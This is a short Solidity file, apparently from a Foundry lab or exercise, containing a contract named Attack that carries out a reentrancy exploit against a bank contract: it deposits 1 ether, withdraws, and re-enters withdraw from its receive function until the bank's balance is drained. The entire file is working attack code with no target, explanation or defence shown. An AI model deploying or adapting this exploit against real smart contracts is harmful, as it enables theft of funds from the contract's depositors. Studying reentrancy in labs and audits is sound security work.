pragma solidity 0.8.17;
import "forge-std/console.sol";

interface IBank {
    function deposit() external payable;
    function withdraw() external;
}

contract Attack  {
    event Received(address indexed sender, uint256 value);
    
    address public immutable bank;

    constructor(address _bank) {
        bank = _bank;
    }

    function attack() external {
        IBank(bank).deposit{value:1 ether}();
        IBank(bank).withdraw();
    }

    receive() external payable {
        emit Received(msg.sender, msg.value);
        if (address(bank).balance > 0 && msg.sender == address(bank)) {
            IBank(bank).withdraw();
        }
    }
}
